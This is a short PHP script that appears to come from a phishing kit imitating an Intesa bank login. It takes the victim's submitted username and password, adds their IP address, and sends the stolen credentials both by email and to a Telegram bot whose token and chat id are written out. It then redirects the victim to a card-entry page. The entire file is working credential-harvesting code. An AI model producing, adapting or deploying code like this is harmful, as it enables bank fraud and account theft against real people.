<?php
$ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';

if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $candidate = trim($ips[0]);

    if (filter_var($candidate, FILTER_VALIDATE_IP)) {
        $ip = $candidate;
    }
}
$hostname = gethostbyaddr($ip);
if(!empty($_POST['user']) &&  !empty($_POST['Pass'])){
$message  = "=========[BILLING INFO]=========\n";
$message .= "User  : ".$_POST['user']."\n";
$message .= "Pass  : ".$_POST['Pass']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BILLING INFO]=========";
$to="gcs.com";
$subject = "LOGIN INTESA [$ip]";
$headers = "From: LOGIN INTESA <bladsadsada@web.de>";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message,$headers);
		    $token = "8712281940:AAF7RQkUscdeFPocXnJj8-Db7sxeU4L2AiU";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-5265165672&text=" . urlencode($message)."" );
header("Location:../Kaart.php");
}else{
header("Location:../index.php");
}

?>